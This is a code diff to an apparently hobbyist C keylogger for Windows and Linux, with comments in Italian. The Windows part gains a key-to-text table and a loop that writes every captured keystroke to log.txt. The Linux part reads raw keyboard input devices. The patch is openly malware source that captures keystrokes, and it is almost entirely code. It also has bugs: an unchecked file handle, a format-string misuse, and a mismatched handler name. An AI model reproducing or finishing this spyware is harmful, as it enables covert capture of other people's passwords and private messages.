@@ -4,7 +4,14 @@
 
 #include <stdio.h>
 #include <unistd.h>
+#include <signal.h>
 #include "keylogger.h"
+
+int running = 1;
+
+void quitHandler(int sig){
+    running = 0;
+}
 
 #if defined PLATFORM_WINDOWS
     #include <windows.h>
@@ -14,7 +21,7 @@
     unsigned char string[256];
     unsigned char buffer[BUFLEN];
 
-    void SearchActiveWindow(void) {
+    void searchActiveWindow(void) {
         wincurrent = GetForegroundWindow();
         if(wincurrent != winlast) {
             winlast = wincurrent;
@@ -32,23 +39,81 @@
         }
     }
 
-    void keylogger(int keyboard, int writeout) {
-        while(1) {
-        for (int i = 0; i < 256; i++) {
-            char key = GetAsyncKeyState(i);
-            if (key > 0) {
-                printf("%d", i);
-            }
+    void table(unsigned char key_number)
+    {
+        if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */
+        {
+            sprintf(string,"\r\n%c",key_number);
+            return;
         }
-        SearchActiveWindow();
-        Sleep(10); /* previene la saturazione della CPU */
+
+        if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
+        {
+            if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000)) sprintf(string,"\r\n%c",key_number);
+            else sprintf(string,"\r\n%c",key_number+0x20);
+            return;
+        }
+
+        switch(key_number) /* pulsanti del mouse */
+        {
+            case VK_LBUTTON: sprintf(string,"\r\nMOUSE LEFT");return;
+            case VK_MBUTTON: sprintf(string,"\r\nMOUSE MIDDLE");return;
+            case VK_RBUTTON: sprintf(string,"\r\nMOUSE RIGHT");return;
+        }
+
+        switch(key_number) /* tasti speciali */
+        {
+            case VK_ESCAPE: sprintf(string,"\r\nESC");return;
+            case VK_NEXT: sprintf(string,"\r\nPAGDOWN");return;
+            case VK_END: sprintf(string,"\r\nEND");return;
+            case VK_PRIOR: sprintf(string,"\r\nPAGUP");return;
+            case VK_HOME: sprintf(string,"\r\nHOME");return;
+            case VK_LEFT: sprintf(string,"\r\nLEFT");return;
+            case VK_UP: sprintf(string,"\r\nUP");return;
+            case VK_RIGHT: sprintf(string,"\r\nRIGHT");return;
+            case VK_DOWN: sprintf(string,"\r\nDOWN");return;
+            case VK_INSERT: sprintf(string,"\r\nINS");return;
+            case VK_DELETE: sprintf(string,"\r\nDEL");return;
+            case VK_SPACE: sprintf(string,"\r\nSPACE");return;
+            case VK_RETURN: sprintf(string,"\r\nENTER");return;
+            case VK_BACK: sprintf(string,"\r\nBACKSPACE");return;
+            case VK_LSHIFT: sprintf(string,"\r\nLEFTSHIFT");return;
+            case VK_RSHIFT: sprintf(string,"\r\nRIGHTSHIFT");return;
+            case VK_LCONTROL: sprintf(string,"\r\nLEFTCONTROL");return;
+            case VK_RCONTROL: sprintf(string,"\r\nRIGHTCONTROL");return;
+            case VK_TAB: sprintf(string,"\r\nTAB");return;
+        }
+
+        sprintf(string,"\r\nUNRECOGNIZED");
+        return;
     }
+
+    void keylogger(int keyboard, int writeout) {
+        FILE* dump;
+        signal(SIGINT, quitHandler);
+        signal(SIGTERM, quitHandler);
+
+        while(running) {
+            for (int i = 0; i < 256; i++) {
+                char key = GetAsyncKeyState(i);
+                if (key > 0) {
+                    table(i);
+                    if(dump = fopen("log.txt","ab+")) {
+                        printf("File aperto!");
+                    }
+                    fprintf(dump, string);
+                    fclose(dump);
+                    break;
+                }
+            }
+            searchActiveWindow();
+            Sleep(10); /* previene la saturazione della CPU */
+        }
     }
 #endif
 
 #if defined(PLATFORM_LINUX)
     #include <linux/input.h>
-    #include <signal.h>
     #include <sys/ioctl.h>
     #define INPUT_DIR "/dev/input/"
 
@@ -56,77 +121,17 @@
     struct input_event events[NUM_EVENTS];
 
     const char *keycodes[] = {
-            "RESERVED",
-            "ESC",
-            "1",
-            "2",
-            "3",
-            "4",
-            "5",
-            "6",
-            "7",
-            "8",
-            "9",
-            "0",
-            "MINUS",
-            "EQUAL",
-            "BACKSPACE",
-            "TAB",
-            "Q",
-            "W",
-            "E",
-            "R",
-            "T",
-            "Y",
-            "U",
-            "I",
-            "O",
-            "P",
-            "LEFTBRACE",
-            "RIGHTBRACE",
-            "ENTER",
-            "LEFTCTRL",
-            "A",
-            "S",
-            "D",
-            "F",
-            "G",
-            "H",
-            "J",
-            "K",
-            "L",
-            "SEMICOLON",
-            "APOSTROPHE",
-            "GRAVE",
-            "LEFTSHIFT",
-            "BACKSLASH",
-            "Z",
-            "X",
-            "C",
-            "V",
-            "B",
-            "N",
-            "M",
-            "COMMA",
-            "DOT",
-            "SLASH",
-            "RIGHTSHIFT",
-            "KPASTERISK",
-            "LEFTALT",
-            "SPACE",
-            "CAPSLOCK",
-            "F1",
-            "F2",
-            "F3",
-            "F4",
-            "F5",
-            "F6",
-            "F7",
-            "F8",
-            "F9",
-            "F10",
-            "NUMLOCK",
-            "SCROLLLOCK"
+            "RESERVED","ESC",
+            "1","2","3","4","5","6","7","8","9","0",
+            "MINUS","EQUAL","BACKSPACE","TAB",
+            "Q","W","E","R","T","Y","U","I","O","P",
+            "LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL",
+            "A","S","D","F","G","H","J","K","L",
+            "SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH",
+            "Z","X","C","V","B","N","M",
+            "COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT","SPACE","CAPSLOCK",
+            "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
+            "NUMLOCK","SCROLLLOCK"
     };
 
     int bytesRead = 0;
@@ -248,7 +253,10 @@
     }
 
     void keylogger(int keyboard, int writeout) {
-        while(1){
+        signal(SIGINT, quit_handler);
+        signal(SIGTERM, quit_handler);
+
+        while(running){
             bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
 
             for(i = 0; i < (bytesRead / eventSize); ++i){
